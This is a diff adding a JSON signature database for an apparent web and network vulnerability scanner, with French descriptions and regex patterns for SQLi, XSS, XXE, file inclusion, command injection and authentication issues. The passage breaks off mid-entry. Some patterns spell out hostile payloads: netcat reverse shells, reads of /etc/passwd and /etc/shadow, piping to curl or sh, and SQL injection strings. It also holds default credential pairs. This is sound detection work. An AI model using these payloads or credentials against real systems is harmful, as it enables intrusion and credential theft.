@@ -1,0 +1,2475 @@
+{
+  "metadata": {
+    "version": "1.2",
+    "created": "2025-09-15",
+    "description": "Signatures complètes et optimisées pour la détection de vulnérabilités - Version améliorée",
+    "author": "Security Scanner",
+    "total_signatures": 270
+  },
+  "vulnerability_names": {
+    "sql_injection": "SQLi",
+    "cross-site_scripting": "XSS",
+    "xml_external_entity": "XXE",
+    "local_file_inclusion": "LFI",
+    "remote_file_inclusion": "RFI",
+    "command_injection": "CMDi",
+    "cross-site_request_forgery": "CSRF",
+    "server_side_template_injection": "SSTI",
+    "insecure_direct_object_reference": "IDOR",
+    "cors_misconfiguration": "CORS",
+    "open_redirect": "OpenRedir",
+    "clickjacking": "Clickjack",
+    "ldap_injection": "LDAPi",
+    "xpath_injection": "XPathi",
+    "wordpress_exposure": "WPExpose",
+    "drupal_exposure": "DrupalExp",
+    "joomla_exposure": "JoomlaExp",
+    "magento_exposure": "MagentoExp",
+    "websocket_injection": "WSInject",
+    "server_sent_events": "SSE",
+    "http_header_injection": "HeaderInj",
+    "insecure_cookie": "InsecCookie",
+    "exposed_admin_panel": "AdminPanel",
+    "session_fixation": "SessFix",
+    "insecure_file_upload": "InsecUpload",
+    "xmlrpc_exposure": "XMLRPC",
+    "http_parameter_pollution": "HPP",
+    "insecure_redirect": "InsecRedir",
+    "exposed_config_files": "ConfigExpose",
+    "insecure_api_endpoint": "InsecAPI",
+    "csrf_token_bypass": "CSRFbypass",
+    "insecure_csp": "InsecCSP",
+    "exposed_api_docs": "APIDocs",
+    "insecure_form_validation": "InsecForm",
+    "exposed_logs": "LogExpose",
+    "insecure_captcha": "InsecCaptcha",
+    "exposed_backup_files": "BackupExpose",
+    "insecure_session_timeout": "InsecSessTime",
+    "exposed_debug_info": "DebugExpose",
+    "insecure_file_extension": "InsecExt",
+    "exposed_api_key": "APIKeyExpose",
+    "insecure_redirect_loop": "RedirLoop",
+    "exposed_credentials": "CredsExpose",
+    "insecure_header_exposure": "HeaderExpose",
+    "weak_passwords": "WeakPass",
+    "default_credentials": "DefaultCreds",
+    "jwt_vulnerabilities": "JWT",
+    "credential_stuffing": "CredStuff",
+    "oauth_misconfiguration": "OAuthMisconfig",
+    "brute_force_login": "BruteForce",
+    "token_leakage": "TokenLeak",
+    "insecure_session_management": "InsecSess",
+    "password_reset_abuse": "PassResetAbuse",
+    "missing_mfa": "NoMFA",
+    "insecure_token_validation": "InsecToken",
+    "exposed_session_data": "SessDataExpose",
+    "open_ports": "OpenPorts",
+    "ssl/tls_issues": "SSL/TLS",
+    "dns_spoofing": "DNSSpoof",
+    "snmp_exposure": "SNMPExpose",
+    "arp_poisoning": "ARPPoison",
+    "port_scanning": "PortScan",
+    "vlan_hopping": "VLANHop",
+    "telnet_exposure": "TelnetExp",
+    "insecure_ftp": "InsecFTP",
+    "smb_vulnerabilities": "SMBVuln",
+    "rdp_exposure": "RDPExpose",
+    "insecure_dns_config": "InsecDNS",
+    "directory_traversal": "DirTrav",
+    "information_disclosure": "InfoDisc",
+    "backup_files": "BackupFiles",
+    "http_method_misconfiguration": "HTTPMethod",
+    "unpatched_server": "UnpatchedSrv",
+    "heartbleed_vulnerability": "Heartbleed",
+    "nginx_misconfiguration": "NginxMisconfig",
+    "apache_misconfiguration": "ApacheMisconfig",
+    "exposed_server_status": "SrvStatus",
+    "insecure_file_permissions": "InsecPerms",
+    "exposed_cgi_bin": "CGIExpose",
+    "insecure_server_headers": "InsecSrvHeaders",
+    "insecure_deserialization": "InsecDeser",
+    "race_conditions": "RaceCond",
+    "buffer_overflow": "BufOvr",
+    "insecure_library": "InsecLib",
+    "django_misconfiguration": "DjangoMisconfig",
+    "rails_vulnerability": "RailsVuln",
+    "input_validation_failure": "InputValidFail",
+    "insecure_randomness": "InsecRand",
+    "log4j_vulnerability": "Log4jVuln",
+    "insecure_session_storage": "InsecSessStore",
+    "unvalidated_redirects": "UnvalRedir",
+    "insecure_crypto": "InsecCrypto",
+    "insecure_storage": "InsecStore",
+    "certificate_pinning_bypass": "CertPinBypass",
+    "insecure_communication": "InsecComm",
+    "intent_spoofing": "IntentSpoof",
+    "insecure_permissions": "InsecPerm",
+    "exposed_components": "CompExpose",
+    "insecure_backup": "InsecBackup",
+    "broken_authentication": "BrokenAuth",
+    "excessive_data_exposure": "DataExpose",
+    "rate_limiting_issues": "RateLimit",
+    "graphql_injection": "GraphQLi",
+    "api_key_leakage": "APIKeyLeak",
+    "broken_object_level_auth": "BOLA",
+    "insecure_api_versioning": "InsecAPIVer",
+    "exposed_api_endpoints": "APIEndExpose",
+    "insecure_data_validation": "InsecDataVal",
+    "api_dos": "APIDoS",
+    "insecure_cors_api": "InsecCORSApi",
+    "graphql_introspection": "GraphQLIntro",
+    "insecure_api_auth": "InsecAPIAuth",
+    "misconfigured_s3_buckets": "S3Misconfig",
+    "exposed_cloud_metadata": "CloudMeta",
+    "iam_misconfiguration": "IAMMisconfig",
+    "exposed_storage_account": "StorageExpose",
+    "insecure_lambda_config": "LambdaMisconfig",
+    "exposed_cloud_credentials": "CloudCreds",
+    "insecure_vpc_config": "VPCMisconfig",
+    "exposed_cloud_api": "CloudAPIExpose",
+    "insecure_kms_key": "InsecKMS",
+    "cloudtrail_disabled": "CloudTrailOff",
+    "default_iot_credentials": "IoTCreds",
+    "insecure_firmware": "InsecFirmware",
+    "mqtt_exposure": "MQTTExpose",
+    "telnet_iot_exposure": "IoTTelnet",
+    "insecure_iot_protocol": "InsecIoTProto",
+    "exposed_iot_api": "IoTAPIExpose",
+    "insecure_iot_auth": "InsecIoTAuth",
+    "iot_hardcoded_credentials": "IoTHardCreds",
+    "iot_unencrypted_comms": "IoTUnencComm",
+    "iot_exposed_ports": "IoTPorts",
+    "nosql_injection": "NoSQLi",
+    "database_exposure": "DBExpose",
+    "mysql_misconfiguration": "MySQLMisconfig",
+    "postgresql_exposure": "PostgresExp",
+    "oracle_exposure": "OracleExp",
+    "redis_misconfiguration": "RedisMisconfig",
+    "mongodb_misconfiguration": "MongoMisconfig",
+    "couchdb_exposure": "CouchDBExp",
+    "sql_server_exposure": "SQLSrvExp",
+    "insecure_db_credentials": "InsecDBCreds",
+    "db_backup_exposure": "DBBackupExp",
+    "insecure_db_port": "InsecDBPort",
+    "docker_misconfiguration": "DockerMisconfig",
+    "kubernetes_exposure": "KubeExpose",
+    "insecure_container_image": "InsecContImg",
+    "rbac_misconfiguration": "RBACMisconfig",
+    "exposed_docker_api": "DockerAPIExp",
+    "insecure_kube_config": "InsecKubeCfg",
+    "container_escape": "ContEscape",
+    "insecure_docker_registry": "InsecDockReg",
+    "exposed_kube_dashboard": "KubeDashExp",
+    "insecure_container_network": "InsecContNet",
+    "prototype_pollution": "ProtoPoll",
+    "server_side_request_forgery": "SSRF",
+    "http_request_smuggling": "HRSmuggling",
+    "insecure_websocket": "InsecWS",
+    "oauth_token_leakage": "OAuthTokenLeak",
+    "jwt_none_algorithm": "JWTnone",
+    "graphql_batching": "GraphQLBatch",
+    "api_version_enumeration": "APIVersionEnum",
+    "cloud_metadata_ssrf": "CloudMetaSSRF"
+  },
+  "categories": {
+    "web_vulnerabilities": {
+      "description": "Vulnérabilités des applications web",
+      "signatures": [
+        {
+          "id": "SQL-001",
+          "name": "sql_injection",
+          "severity": "élevé",
+          "category": "injection",
+          "patterns": [
+            "(?i)'\\s*OR\\s*'1'='1",
+            "(?i)'\\s*OR\\s*1=1--",
+            "(?i)'\\s*;\\s*DROP\\s+TABLE",
+            "(?i)UNION\\s+SELECT",
+            "(?i)'\\s*HAVING\\s*1=1--",
+            "(?i)'\\s*ORDER\\s+BY\\s+\\d+",
+            "(?i)'\\s*GROUP\\s+BY\\s+\\d+",
+            "(?i)admin'--",
+            "(?i)'\\s*OR\\s*'a'='a",
+            "(?i)'\\s*WAITFOR\\s+DELAY\\s+'[^']+'",
+            "(?i)BENCHMARK\\(\\d+,\\s*MD5\\('[^']+'\\)\\)",
+            "(?i)SLEEP\\(\\d+\\)",
+            "(?i)pg_sleep\\(\\d+\\)"
+          ],
+          "description": "Détection d'injections SQL (optimisée)"
+        },
+        {
+          "id": "XSS-001",
+          "name": "cross-site_scripting",
+          "severity": "moyen",
+          "category": "injection",
+          "patterns": [
+            "(?i)<script[^>]*>.*?</script>",
+            "(?i)javascript:[^\\s]+",
+            "(?i)onload\\s*=\\s*['\"].*?['\"]",
+            "(?i)onerror\\s*=\\s*['\"].*?['\"]",
+            "(?i)onclick\\s*=\\s*['\"].*?['\"]",
+            "(?i)onmouseover\\s*=\\s*['\"].*?['\"]",
+            "(?i)<img\\s+[^>]*onerror\\s*=\\s*['\"].*?['\"]",
+            "(?i)<iframe[^>]*>",
+            "(?i)eval\\([^)]*\\)",
+            "(?i)document\\.cookie",
+            "(?i)alert\\([^)]*\\)",
+            "(?i)prompt\\([^)]*\\)",
+            "(?i)confirm\\([^)]*\\)"
+          ],
+          "description": "Détection de XSS (optimisée pour réduire les faux positifs)"
+        },
+        {
+          "id": "XXE-001",
+          "name": "xml_external_entity",
+          "severity": "élevé",
+          "category": "injection",
+          "patterns": [
+            "(?i)<!ENTITY\\s+[^>]+SYSTEM\\s+['\"]file://",
+            "(?i)<!DOCTYPE\\s+[^>]+>",
+            "(?i)%xxe;",
+            "(?i)&xxe;",
+            "(?i)<!ENTITY\\s+%\\s*xxe",
+            "(?i)<!ENTITY\\s+.*SYSTEM\\s+['\"]http://",
+            "(?i)<?xml[^>]*\\?>\\s*<!DOCTYPE"
+          ],
+          "description": "Détection d'attaques XXE (optimisée)"
+        },
+        {
+          "id": "LFI-001",
+          "name": "local_file_inclusion",
+          "severity": "élevé",
+          "category": "file_inclusion",
+          "patterns": [
+            "\\.\\./\\.\\./\\.\\./etc/passwd",
+            "\\.\\./\\.\\./\\.\\./windows/system32",
+            "/etc/passwd",
+            "/etc/shadow",
+            "\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
+            "file://",
+            "php://filter",
+            "php://input",
+            "data://text/plain",
+            "php://fd/",
+            "expect://"
+          ],
+          "description": "Inclusion de fichiers locaux"
+        },
+        {
+          "id": "RFI-001",
+          "name": "remote_file_inclusion",
+          "severity": "élevé",
+          "category": "file_inclusion",
+          "patterns": [
+            "http://[^\\s]+/shell\\.php",
+            "https://pastebin\\.com/raw/",
+            "ftp://",
+            "\\?file=http://",
+            "\\?page=http://",
+            "\\?include=http://",
+            "\\?path=http://",
+            "\\?document=http://"
+          ],
+          "description": "Inclusion de fichiers distants"
+        },
+        {
+          "id": "CMD-001",
+          "name": "command_injection",
+          "severity": "critique",
+          "category": "injection",
+          "patterns": [
+            ";\\s*cat\\s+/etc/passwd",
+            "\\|\\s*whoami",
+            "&&\\s*id",
+            ";\\s*ls\\s+-la",
+            "`id`",
+            "\\$\\(whoami\\)",
+            ";\\s*nc\\s+-e\\s+/bin/sh",
+            "\\|\\s*nc\\s+-l\\s+-p",
+            ";\\s*wget",
+            "\\|\\s*curl",
+            "\\|\\s*base64",
+            "\\|\\s*sh",
+            "\\$\\{IFS\\}whoami"
+          ],
+          "description": "Injection de commandes système"
+        },
+        {
+          "id": "CSRF-001",
+          "name": "cross-site_request_forgery",
+          "severity": "moyen",
+          "category": "csrf",
+          "patterns": [
+            "<form\\s+method=['\"]post['\"]\\s+action=['\"]",
+            "<img\\s+src=['\"]http://victim.com/delete",
+            "<script>document\\.forms\\[0\\]\\.submit\\(\\)</script>",
+            "fetch\\(['\"]http://victim.com/api/delete['\"]",
+            "<iframe\\s+src=['\"]http://victim.com/admin"
+          ],
+          "description": "Attaques CSRF"
+        },
+        {
+          "id": "SSTI-001",
+          "name": "server_side_template_injection",
+          "severity": "élevé",
+          "category": "injection",
+          "patterns": [
+            "\\{\\{.*\\}\\}",
+            "\\{%.*%\\}",
+            "\\$\\{.*\\}",
+            "\\{\\{7\\*7\\}\\}",
+            "\\{%\\s*if.*%\\}",
+            "\\{\\{request\\..*\\}\\}",
+            "\\{\\{config\\..*\\}\\}",
+            "\\{%\\s*block.*%\\}",
+            "\\{\\{self\\..*\\}\\}",
+            "\\{\\{_self\\..*\\}\\}",
+            "\\$\\{7\\*7\\}"
+          ],
+          "description": "Détection d'injections de templates côté serveur (SSTI)"
+        },
+        {
+          "id": "IDOR-001",
+          "name": "insecure_direct_object_reference",
+          "severity": "moyen",
+          "category": "access_control",
+          "patterns": [
+            "\\?id=\\d+",
+            "\\?user_id=\\d+",
+            "\\?account=\\d+",
+            "\\?resource=\\w+",
+            "/api/v\\d+/users/\\d+",
+            "/profile/\\d+",
+            "/download/\\d+"
+          ],
+          "description": "Références directes non sécurisées aux objets (IDOR)"
+        },
+        {
+          "id": "CORS-001",
+          "name": "cors_misconfiguration",
+          "severity": "moyen",
+          "category": "access_control",
+          "patterns": [
+            "Access-Control-Allow-Origin: \\*",
+            "Access-Control-Allow-Credentials: true",
+            "Access-Control-Allow-Methods: \\*",
+            "Access-Control-Allow-Headers: \\*"
+          ],
+          "description": "Mauvaise configuration CORS"
+        },
+        {
+          "id": "OPEN-REDIRECT-001",
+          "name": "open_redirect",
+          "severity": "moyen",
+          "category": "redirection",
+          "patterns": [
+            "\\?redirect=http://",
+            "\\?url=https://",
+            "\\?next=//",
+            "\\?goto=\\w+",
+            "Location: http://",
+            "Location: //",
+            "\\?dest=http://",
+            "\\?return=http://"
+          ],
+          "description": "Redirections non validées"
+        },
+        {
+          "id": "WEB-005",
+          "name": "clickjacking",
+          "severity": "faible",
+          "category": "ui_redressing",
+          "patterns": [
+            "<iframe\\s+src=['\"]http",
+            "X-Frame-Options: (?!DENY|SAMEORIGIN)",
+            "<frame\\s+src=['\"]http"
+          ],
+          "description": "Attaques de clickjacking"
+        },
+        {
+          "id": "WEB-006",
+          "name": "ldap_injection",
+          "severity": "élevé",
+          "category": "injection",
+          "patterns": [
+            "\\*\\(.*\\)",
+            "\\&\\(.*\\)",
+            "\\|\\(.*\\)",
+            "cn=.*\\*",
+            "uid=.*\\*",
+            "(&(uid=.*)(userPassword=.*))",
+            "(|(uid=.*)(cn=.*))"
+          ],
+          "description": "Détection d'injections LDAP"
+        },
+        {
+          "id": "WEB-007",
+          "name": "xpath_injection",
+          "severity": "élevé",
+          "category": "injection",
+          "patterns": [
+            "//\\w+\\[.*\\]",
+            "/\\w+\\[.*\\]",
+            "or\\s+1=1",
+            "and\\s+1=1",
+            "'\\]\\|\\|'1'='1"
+          ],
+          "description": "Détection d'injections XPath"
+        },
+        {
+          "id": "WEB-008",
+          "name": "wordpress_exposure",
+          "severity": "moyen",
+          "category": "cms",
+          "patterns": [
+            "wp-admin/",
+            "wp-content/",
+            "wp-login\\.php",
+            "xmlrpc\\.php",
+            "wp-json/",
+            "wp-includes/"
+          ],
+          "description": "Exposition de fichiers WordPress sensibles"
+        },
+        {
+          "id": "WEB-009",
+          "name": "drupal_exposure",
+          "severity": "moyen",
+          "category": "cms",
+          "patterns": [
+            "/sites/default/",
+            "/modules/",
+            "CHANGELOG\\.txt",
+            "user/login",
+            "/core/",
+            "/vendor/"
+          ],
+          "description": "Exposition de fichiers Drupal sensibles"
+        },
+        {
+          "id": "WEB-010",
+          "name": "joomla_exposure",
+          "severity": "moyen",
+          "category": "cms",
+          "patterns": [
+            "/administrator/",
+            "joomla\\.xml",
+            "/components/",
+            "configuration\\.php",
+            "/libraries/",
+            "/plugins/"
+          ],
+          "description": "Exposition de fichiers Joomla sensibles"
+        },
+        {
+          "id": "WEB-011",
+          "name": "magento_exposure",
+          "severity": "moyen",
+          "category": "cms",
+          "patterns": [
+            "/magento_version",
+            "/downloader/",
+            "/app/etc/local\\.xml",
+            "/admin/",
+            "/var/",
+            "/pub/"
+          ],
+          "description": "Exposition de fichiers Magento sensibles"
+        },
+        {
+          "id": "WEB-012",
+          "name": "websocket_injection",
+          "severity": "moyen",
+          "category": "injection",
+          "patterns": [
+            "ws://",
+            "wss://",
+            "WebSocket\\s*\\(",
+            "onmessage\\s*=\\s*['\"].*?['\"]"
+          ],
+          "description": "Détection d'injections via WebSocket"
+        },
+        {
+          "id": "WEB-013",
+          "name": "server_sent_events",
+          "severity": "moyen",
+          "category": "injection",
+          "patterns": [
+            "text/event-stream",
+            "EventSource\\s*\\(",
+            "data:\\s*\\{.*\\}"
+          ],
+          "description": "Vulnérabilités liées aux Server-Sent Events"
+        },
+        {
+          "id": "WEB-014",
+          "name": "http_header_injection",
+          "severity": "élevé",
+          "category": "injection",
+          "patterns": [
+            "\\r\\nHost:",
+            "\\r\\nSet-Cookie:",
+            "\\r\\nLocation:",
+            "\\r\\nContent-Length:",
+            "\\r\\nTransfer-Encoding:"
+          ],
+          "description": "Injection dans les en-têtes HTTP (CRLF)"
+        },
+        {
+          "id": "WEB-015",
+          "name": "insecure_cookie",
+          "severity": "moyen",
+          "category": "configuration",
+          "patterns": [
+            "Set-Cookie:.*(?![Hh]ttpOnly)(?![Ss]ecure)",
+            "SameSite=None"
+          ],
+          "description": "Cookies non sécurisés (manque HttpOnly ou Secure)"
+        },
+        {
+          "id": "WEB-016",
+          "name": "exposed_admin_panel",
+          "severity": "élevé",
+          "category": "access_control",
+          "patterns": [
+            "/admin/",
+            "/dashboard/",
+            "/controlpanel/",
+            "/wp-admin/",
+            "/administrator/",
+            "/cpanel/",
+            "/manager/",
+            "/backend/"
+          ],
+          "description": "Exposition de panneaux d'administration"
+        },
+        {
+          "id": "WEB-017",
+          "name": "session_fixation",
+          "severity": "moyen",
+          "category": "authentication",
+          "patterns": [
+            "session_id=\\w+",
+            "PHPSESSID=\\w+",
+            "JSESSIONID=\\w+",
+            "ASPSESSIONID=\\w+"
+          ],
+          "description": "Attaques de fixation de session"
+        },
+        {
+          "id": "WEB-018",
+          "name": "insecure_file_upload",
+          "severity": "élevé",
+          "category": "file_inclusion",
+          "patterns": [
+            "multipart/form-data",
+            "\\.php$",
+            "\\.exe$",
+            "\\.sh$",
+            "\\.jsp$",
+            "\\.asp$"
+          ],
+          "description": "Téléversement de fichiers non sécurisé"
+        },
+        {
+          "id": "WEB-019",
+          "name": "xmlrpc_exposure",
+          "severity": "moyen",
+          "category": "exposure",
+          "patterns": [
+            "xmlrpc\\.php",
+            "<methodCall>",
+            "<methodName>"
+          ],
+          "description": "Exposition de l'interface XML-RPC"
+        },
+        {
+          "id": "WEB-020",
+          "name": "http_parameter_pollution",
+          "severity": "moyen",
+          "category": "injection",
+          "patterns": [
+            "\\?\\w+=.*&\\w+=.*",
+            "\\?id=.*&id=.*"
+          ],
+          "description": "Pollution des paramètres HTTP"
+        },
+        {
+          "id": "WEB-021",
+          "name": "insecure_redirect",
+          "severity": "moyen",
+          "category": "redirection",
+          "patterns": [
+            "302 Found",
+            "Location: http://external\\.com"
+          ],
+          "description": "Redirections non sécurisées"
+        },
+        {
+          "id": "WEB-022",
+          "name": "exposed_config_files",
+          "severity": "élevé",
+          "category": "exposure",
+          "patterns": [
+            "\\.env",
+            "config\\.json",
+            "settings\\.py",
+            "database\\.yml",
+            "application\\.properties",
+            "secrets\\.yaml"
+          ],
+          "description": "Exposition de fichiers de configuration"
+        },
+        {
+          "id": "WEB-023",
+          "name": "insecure_api_endpoint",
+          "severity": "élevé",
+          "category": "api",
+          "patterns": [
+            "/api/v\\d+/public/",
+            "/api/v\\d+/users/",
+            "/api/v\\d+/admin/"
+          ],
+          "description": "Points de terminaison API non sécurisés"
+        },
+        {
+          "id": "WEB-024",
+          "name": "csrf_token_bypass",
+          "severity": "moyen",
+          "category": "csrf",
+          "patterns": [
+            "csrf_token=\\w+",
+            "no-csrf-token",
+            "csrfmiddlewaretoken=\\w+",
+            "authenticity_token=\\w+"
+          ],
+          "description": "Contournement de jetons CSRF"
+        },
+        {
+          "id": "WEB-025",
+          "name": "insecure_csp",
+          "severity": "moyen",
+          "category": "configuration",
+          "patterns": [
+            "Content-Security-Policy:.*unsafe-inline",
+            "Content-Security-Policy:.*unsafe-eval",
+            "Content-Security-Policy:.*\\*"
+          ],
+          "description": "Politique de sécurité de contenu (CSP) non sécurisée"
+        },
+        {
+          "id": "WEB-026",
+          "name": "exposed_api_docs",
+          "severity": "moyen",
+          "category": "exposure",
+          "patterns": [
+            "/swagger/",
+            "/api-docs/",
+            "/openapi\\.json",
+            "/swagger\\.json",
+            "/docs/",
+            "/redoc/"
+          ],
+          "description": "Exposition de la documentation API"
+        },
+        {
+          "id": "WEB-027",
+          "name": "insecure_form_validation",
+          "severity": "moyen",
+          "category": "validation",
+          "patterns": [
+            "<form\\s+.*novalidate",
+            "<input\\s+.*type=['\"]text['\"]"
+          ],
+          "description": "Validation de formulaires non sécurisée"
+        },
+        {
+          "id": "WEB-028",
+          "name": "exposed_logs",
+          "severity": "élevé",
+          "category": "exposure",
+          "patterns": [
+            "\\.log$",
+            "access\\.log",
+            "error\\.log",
+            "debug\\.log"
+          ],
+          "description": "Exposition de fichiers de logs"
+        },
+        {
+          "id": "WEB-029",
+          "name": "insecure_captcha",
+          "severity": "moyen",
+          "category": "authentication",
+          "patterns": [
+            "captcha=\\w+",
+            "recaptcha_response=\\w+",
+            "no-captcha"
+          ],
+          "description": "Captchas non sécurisés ou absents"
+        },
+        {
+          "id": "WEB-030",
+          "name": "exposed_backup_files",
+          "severity": "élevé",
+          "category": "exposure",
+          "patterns": [
+            "\\.bak$",
+            "\\.backup$",
+            "\\.tar$",
+            "\\.gz$",
+            "\\.sql$"
+          ],
+          "description": "Exposition de fichiers de sauvegarde"
+        },
+        {
+          "id": "WEB-031",
+          "name": "insecure_session_timeout",
+          "severity": "moyen",
+          "category": "authentication",
+          "patterns": [
+            "session_timeout=\\d+",
+            "session_expires=\\d+"
+          ],
+          "description": "Délai d'expiration de session non sécurisé"
+        },
+        {
+          "id": "WEB-032",
+          "name": "exposed_debug_info",
+          "severity": "moyen",
+          "category": "exposure",
+          "patterns": [
+            "debug=true",
+            "X-Debug-Info:",
+            "trace=\\w+",
+            "X-Request-ID:"
+          ],
+          "description": "Exposition d'informations de débogage"
+        },
+        {
+          "id": "WEB-033",
+          "name": "insecure_file_extension",
+          "severity": "élevé",
+          "category": "file_inclusion",
+          "patterns": [
+            "\\.php[0-9]$",
+            "\\.asp$",
+            "\\.aspx$",
+            "\\.jsp$",
+            "\\.cgi$"
+          ],
+          "description": "Extensions de fichiers non sécurisées"
+        },
+        {
+          "id": "WEB-034",
+          "name": "exposed_api_key",
+          "severity": "élevé",
+          "category": "exposure",
+          "patterns": [
+            "api_key=\\w+",
+            "secret_key=\\w+",
+            "token=\\w+",
+            "apikey=\\w+"
+          ],
+          "description": "Exposition de clés API"
+        },
+        {
+          "id": "WEB-035",
+          "name": "insecure_redirect_loop",
+          "severity": "moyen",
+          "category": "redirection",
+          "patterns": [
+            "Location:.*\\?redirect=.*",
+            "302.*Location:.*\\?next=.*"
+          ],
+          "description": "Boucles de redirection non sécurisées"
+        },
+        {
+          "id": "WEB-036",
+          "name": "exposed_credentials",
+          "severity": "critique",
+          "category": "exposure",
+          "patterns": [
+            "password=\\w+",
+            "username=\\w+",
+            "credentials=\\w+",
+            "passwd=\\w+"
+          ],
+          "description": "Exposition d'identifiants dans les URL"
+        },
+        {
+          "id": "WEB-037",
+          "name": "insecure_header_exposure",
+          "severity": "moyen",
+          "category": "exposure",
+          "patterns": [
+            "X-Powered-By:.*",
+            "Server:.*",
+            "X-Backend-Server:.*",
+            "X-Generator:.*"
+          ],
+          "description": "Exposition d'en-têtes sensibles"
+        },
+        {
+          "id": "WEB-038",
+          "name": "prototype_pollution",
+          "severity": "élevé",
+          "category": "injection",
+          "patterns": [
+            "__proto__",
+            "constructor\\.prototype",
+            "Object\\.defineProperty",
+            "__defineSetter__"
+          ],
+          "description": "Détection de prototype pollution"
+        },
+        {
+          "id": "WEB-039",
+          "name": "server_side_request_forgery",
+          "severity": "élevé",
+          "category": "injection",
+          "patterns": [
+            "url=http://",
+            "uri=http://",
+            "dest=http://",
+            "fetch=http://",
+            "request=http://",
+            "\\?url=file://",
+            "\\?url=dict://",
+            "\\?url=gopher://"
+          ],
+          "description": "Détection de Server-Side Request Forgery (SSRF)"
+        }
+      ]
+    },
+    "authentication_vulnerabilities": {
+      "description": "Vulnérabilités d'authentification",
+      "signatures": [
+        {
+          "id": "AUTH-001",
+          "name": "weak_passwords",
+          "severity": "moyen",
+          "category": "authentication",
+          "patterns": [
+            "password",
+            "123456",
+            "admin",
+            "root",
+            "guest",
+            "test",
+            "password123",
+            "qwerty",
+            "letmein",
+            "welcome",
+            "passw0rd"
+          ],
+          "description": "Mots de passe faibles"
+        },
+        {
+          "id": "AUTH-002",
+          "name": "default_credentials",
+          "severity": "élevé",
+          "category": "authentication",
+          "patterns": [
+            "admin:admin",
+            "root:root",
+            "admin:password",
+            "admin:123456",
+            "user:user",
+            "guest:guest",
+            "test:test",
+            "pi:raspberry",
+            "ubnt:ubnt",
+            "cisco:cisco"
+          ],
+          "description": "Identifiants par défaut"
+        },
+        {
+          "id": "JWT-001",
+          "name": "jwt_vulnerabilities",
+          "severity": "élevé",
+          "category": "authentication",
+          "patterns": [
+            "\"alg\":\"none\"",
+            "\"typ\":\"JWT\"",
+            "eyJ0eXAiOiJKV1Qi",
+            "HS256",
+            "RS256",
+            "algorithm\":\"none",
+            "\\{\"alg\":\"none\"\\}",
+            "jwt\\s+alg\\s*=\\s*none"
+          ],
+          "description": "Vulnérabilités JWT (algorithme none, clé faible)"
+        },
+        {
+          "id": "AUTH-003",
+          "name": "credential_stuffing",
+          "severity": "moyen",
+          "category": "authentication",
+          "patterns": [
+            "login\\s+attempt\\s+failed",
+            "too\\s+many\\s+login\\s+attempts",
+            "brute\\s+force\\s+detected",
+            "failed\\s+login:\\s+\\d+"
+          ],
+          "description": "Détection d'attaques par credential stuffing"
+        },
+        {
+          "id": "OAUTH-001",
+          "name": "oauth_misconfiguration",
+          "severity": "élevé",
+          "category": "authentication",
+          "patterns": [
+            "client_id=",
+            "client_secret=",
+            "redirect_uri=http://",
+            "access_token=\\w+",
+            "refresh_token=\\w+",
+            "response_type=token",
+            "grant_type=password"
+          ],
+          "description": "Mauvaise configuration OAuth"
+        },
+        {
+          "id": "AUTH-005",
+          "name": "brute_force_login",
+          "severity": "moyen",
+          "category": "authentication",
+          "patterns": [
+            "login\\s+failed:\\s+\\d+",
+            "attempts=\\d+",
+            "bruteforce\\s+detected"
+          ],
+          "description": "Tentatives de connexion par force brute"
+        },
+        {
+          "id": "AUTH-006",
+          "name": "token_leakage",
+          "severity": "élevé",
+          "category": "authentication",
+          "patterns": [
+            "token=\\w+",
+            "auth_token=\\w+",
+            "session_token=\\w+",
+            "jwt=\\w+"
+          ],
+          "description": "Fuite de jetons d'authentification"
+        },
+        {
+          "id": "AUTH-007",
+          "name": "insecure_session_management",
+          "severity": "moyen",
+          "category": "authentication",
+          "patterns": [
+            "session_expires=\\d+",
+            "session_timeout=\\d+"
+          ],
+          "description": "Gestion de sessions non sécurisée"
+        },
+        {
+          "id": "AUTH-008",
+          "name": "password_reset_abuse",
+          "severity": "moyen",
+          "category": "authentication",
+          "patterns": [
+            "reset_token=\\w+",
+            "password_reset=\\w+",
+            "/reset-password/"
+          ],
+          "description": "Abus de réinitialisation de mot de passe"
+        },
+        {
+          "id": "AUTH-009",
+          "name": "missing_mfa",
+          "severity": "moyen",
+          "category": "authentication",
+          "patterns": [
+            "no-mfa",
+            "2fa=disabled",
+            "mfa=false",
+            "two-factor=off"
+          ],
+          "description": "Absence d'authentification multi-facteurs"
+        },
+        {
+          "id": "AUTH-010",
+          "name": "insecure_token_validation",
+          "severity": "élevé",
+          "category": "authentication",
+          "patterns": [
+            "token_validation=false",
+            "verify_token=disabled",
+            "jwt_verify=none"
+          ],
+          "description": "Validation de jetons non sécurisée"
+        },
+        {
+          "id": "AUTH-011",
+          "name": "exposed_session_data",
+          "severity": "élevé",
+          "category": "exposure",
+          "patterns": [
+            "session_data=\\w+",
+            "cookie_data=\\w+",
+            "session_storage=\\w+"
+          ],
+          "description": "Exposition de données de session"
+        }
+      ]
+    },
+    "network_vulnerabilities": {
+      "description": "Vulnérabilités réseau",
+      "signatures": [
+        {
+          "id": "NET-001",
+          "name": "open_ports",
+          "severity": "moyen",
+          "category": "network",
+          "patterns": [
+            "21/tcp open ftp",
+            "22/tcp open ssh",
+            "23/tcp open telnet",
+            "25/tcp open smtp",
+            "53/tcp open domain",
+            "80/tcp open http",
+            "110/tcp open pop3",
+            "143/tcp open imap",
+            "443/tcp open https",
+            "993/tcp open imaps",
+            "995/tcp open pop3s",
+            "3389/tcp open rdp",
+            "5432/tcp open postgresql",
+            "3306/tcp open mysql",
+            "6379/tcp open redis",
+            "27017/tcp open mongod"
+          ],
+          "description": "Ports ouverts suspects"
+        },
+        {
+          "id": "SSL-001",
+          "name": "ssl/tls_issues",
+          "severity": "moyen",
+          "category": "network",
+          "patterns": [
+            "SSLv2",
+            "SSLv3",
+            "TLSv1.0",
+            "RC4",
+            "MD5",
+            "NULL cipher",
+            "EXPORT cipher",
+            "Anonymous cipher"
+          ],
+          "description": "Problèmes SSL/TLS (versions anciennes, chiffrements faibles)"
+        },
+        {
+          "id": "NET-002",
+          "name": "dns_spoofing",
+          "severity": "élevé",
+          "category": "network",
+          "patterns": [
+            "dns\\s+spoof",
+            "dns\\s+cache\\s+poisoning",
+            "dns\\s+rebinding"
+          ],
+          "description": "Détection d'attaques de spoofing DNS"
+        },
+        {
+          "id": "NET-003",
+          "name": "snmp_exposure",
+          "severity": "moyen",
+          "category": "network",
+          "patterns": [
+            "SNMP\\s+v[1-2]",
+            "public\\s+community",
+            "private\\s+community",
+            "161/udp\\s+open"
+          ],
+          "description": "Exposition de services SNMP non sécurisés"
+        },
+        {
+          "id": "NET-004",
+          "name": "arp_poisoning",
